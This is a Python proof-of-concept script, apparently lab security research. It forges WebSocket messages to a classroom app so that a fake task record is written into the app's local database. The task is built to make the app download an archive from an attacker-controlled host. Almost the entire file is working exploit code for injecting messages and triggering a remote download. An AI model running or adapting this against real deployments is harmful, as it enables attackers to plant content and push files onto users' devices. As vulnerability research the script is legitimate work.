# -*- coding: utf-8 -*-
"""inject_task2_db.py - 注入 type=2 TaskDetail => TaskDetailDaoHelper.updateTaskDetail
=> taskDetailDao.insertOrReplace(...)  => 任务真的写进 App 数据库 => 任务列表可见/可触发下载
依据: TaskDetailDaoHelper:4843 insertOrReplace
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"
ZIP = "http://%s/poc7z.7z" % OUR


def env(mtype, data, cid, tag="canvas_tag", cmd=0):
    return json.dumps({
        "cId": cid, "cmd": cmd, "from": "10001", "gt": 0, "id": "1349658", "rt": 1,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
        "tags": ["RWYZKUIF"]}, ensure_ascii=False)


def inj(js, label, wait=10):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    now = int(time.time() * 1000)
    ri = {"sourceId": "LAB_R1", "taskId": "LAB_T1", "name": "poc7z",
          "type": 1, "zipUrl": ZIP, "createTime": now,
          "downloadFilePath": "", "localPath": ""}
    td = {
        "taskId": "LAB_T1", "subTaskId": "LAB_S1", "allTaskId": "LAB_T1",
        "classroomId": ROOM, "classroomName": "lab",
        "desktopId": "LAB_D1", "subDesktopId": "LAB_D1", "defaultDesktopId": "LAB_D1",
        "defaultDesktopName": "lab", "sourceId": "LAB_R1",
        "taskStatus": 0, "taskType": 1, "taskCreateMode": 1, "pptSource": 1,
        "isFromPPT": 1, "number": 1, "originTotalNumber": 1,
        "content": "lab", "memo": "", "createTime": now, "expectedSendDate": now,
        "completed": False, "showStatus": 1, "percent": 0, "progress": "0",
        "positive": 1, "negative": 0, "score": 0.0, "studyTime": 0,
        "viewedIds": "", "viewedNum": 0, "resourceInfo": ri,
    }
    js = json.dumps(td, ensure_ascii=False)
    inj(env(2, js, "179P00060"), "type=2 TaskDetail -> insertOrReplace (canvas_tag)", 12)
    inj(env(2, js, "179P00061", "default_tag"), "type=2 TaskDetail (default_tag)", 12)
    # 再发一次 type=0 让界面走"新建任务"广播刷新
    inj(env(0, js, "179P00062"), "type=0 刷新广播", 12)
    print("done", flush=True)


if __name__ == "__main__":
    main()
